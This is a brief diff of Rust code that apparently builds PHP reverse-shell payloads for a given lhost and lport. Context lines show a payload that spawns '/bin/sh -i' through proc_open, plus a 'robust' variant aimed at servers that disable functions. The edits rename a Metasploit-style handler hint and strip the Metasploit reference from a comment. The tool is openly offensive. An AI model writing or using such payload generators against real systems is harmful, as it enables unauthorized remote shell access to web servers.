@@ -107,7 +107,7 @@ $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
 ?>
 "#, lhost, lport);
 
-    // Robust version with disabled function checks (Metasploit-style)
+    // Robust version with disabled function checks
     let payload_robust = format!(r#"<?php
 $ip='{}';
 $port={};
@@ -142,7 +142,7 @@ fclose($s);
     println!("\n=== Option 3: Robust with disabled function checks ===");
     println!("{}", payload_robust);
 
-    println!("\n[*] Ensure handler is listening: use exploit/multi/handler");
+    println!("\n[*] Ensure handler is listening: use utilities/multi_handler");
 
     0
 }
